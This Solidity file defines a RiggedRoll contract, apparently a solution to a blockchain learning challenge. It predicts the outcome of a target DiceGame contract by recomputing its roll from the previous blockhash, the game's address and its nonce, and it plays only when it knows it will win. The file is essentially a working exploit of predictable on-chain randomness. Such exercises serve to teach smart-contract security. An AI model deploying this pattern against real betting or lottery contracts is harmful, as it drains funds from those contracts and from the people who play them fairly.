pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner
    {
        require(address(this).balance >= _amount);
        (payable(_addr)).transfer(_amount);

    }

    function riggedRoll() public payable onlyOwner
    {
        require(address(this).balance >= .002 ether, "not enough balance in riggedRoll contract");

        uint nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

       require(roll <= 2, "Failed to send enough value in rigg roll");

        // let's play, we know we will win :)
        diceGame.rollTheDice{value: 0.002 ether}();
        
    }

    // so that we can receive eth
    receive() external payable
    {

    } 
    
}
